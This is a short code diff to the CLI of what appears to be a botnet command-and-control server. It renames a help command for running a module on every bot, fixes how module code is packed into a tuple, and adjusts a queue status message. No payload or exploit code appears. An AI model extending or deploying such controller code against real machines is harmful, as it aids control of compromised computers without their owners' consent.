@@ -271,7 +271,7 @@ class ViewCLI(ViewABC):
             self.output("modules              -  Show a list of available modules.")
             self.output("use <module_name>    -  Run the module on the connected bot.")
             self.output("stop <module_name>   -  Ask the module to stop executing.")
-            self.output("setall <module_name> -  Set the module which will be run on every bot.")
+            self.output("useall <module_name> -  Set the module which will be run on every bot.")
             self.output("stopall              -  Clear the globally set module.")
             self.output("clear                -  Clear the screen.")
             self.output("exit/q/quit          -  Close the server and exit.")
@@ -413,13 +413,13 @@ class ViewCLI(ViewABC):
                                 code = (bot.loader_name, loaders.get_update_code(bot.loader_name))
                         else:
                             if not code[0]:
-                                code = modules.get_code(module_name)
+                                code = ("", modules.get_code(module_name))
 
                         self._model.add_command(bot.uid, Command(
                             CommandType.MODULE, code[1], options
                         ))
 
-                    self.output("Module added to the queue of {} bots.".format(len(bots)))
+                    self.output("Module added to the queue of {} bot(s).".format(len(bots)), "info")
                 else:
                     if module_name == "remove_bot":
                         code = loaders.get_remove_code(self._connected_bot.loader_name)
